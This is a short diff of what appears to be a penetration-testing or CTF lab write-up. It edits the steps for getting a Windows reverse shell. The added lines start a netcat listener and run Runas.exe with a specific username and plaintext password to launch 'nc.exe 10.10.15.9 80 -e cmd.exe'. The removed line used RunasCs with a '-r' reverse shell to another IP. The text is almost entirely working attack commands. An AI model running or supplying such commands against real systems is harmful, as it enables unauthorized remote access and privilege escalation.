@@ -6,9 +6,9 @@ Setup a listener on port 80 as observed. Run the below the RunasCs.exe tool usin
 So, just use RunasCs.exe from GitHub, it works great in addition to a built-in reverse shell with -r.
 
 ```
-nc -lvnp 80
+rlwrap nc -lvnp 80
 ```
 
 ```
-.\RunAs.exe administrator admin@123 cmd.exe -r 192.168.45.161:80
+Runas.exe C.Bum Tikkycoll_431012284 "C:\Temp\nc.exe 10.10.15.9 80 -e cmd.exe"
 ```
